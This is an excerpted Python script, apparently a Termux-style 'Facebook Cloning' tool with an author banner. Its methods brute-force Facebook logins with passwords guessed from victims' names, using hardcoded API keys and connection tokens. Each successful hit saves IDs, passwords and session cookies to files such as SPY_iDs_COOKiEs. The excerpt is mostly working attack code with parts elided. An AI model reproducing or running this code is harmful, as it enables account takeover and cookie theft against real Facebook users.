...
logo = """\x1b[1;93m
       ████████ ██ ████████ ██    ██ 
          ...
          ██    ██    ██     ██████        
    \033[1;34m───────────────────────────────────────
    \033[1;31m[ \033[1;32mCODED BY \033[1;31m] \033[1;35m<>  \033[1;32mKANXA HEROOO
    \033[1;31m[ \033[1;32mPROGRAME \033[1;31m] \033[1;35m<>  \033[1;32mFacebook Cloning 
    \033[1;31m[ \033[1;32mWHATSAPP \033[1;31m] \033[1;35m<> \033[1;32m +97798******** 
    \033[1;34m───────────────────────────────────────\033[1;37m"""
def clear():
    os.system("clear")
    print(logo)    
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/SPY_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SPY_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [SPY-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SPY_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Mr.SPY-M3] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Mr.SPY-M2] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KINGb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KINGb};{ckkk}"
                    print(f"\r{A} [SPY-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SPY_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SPY_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{R} [SPY-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SPY_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
    ...
    def methodF(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.SPY-M6] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SPY-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SPY_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def methodE(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.SPY-M5] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.SPY-M4] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				#print(f' Cookie : {coki}')
				open('SPY-VIP-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(uid)
				...
				cid = coki[82:97]
				print('\033[1;92m[SPY-OK] '+cid+' | '+ps+'\033[1;32m')
				open('SPY-cp.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(uid)
				break
			else:
				continue
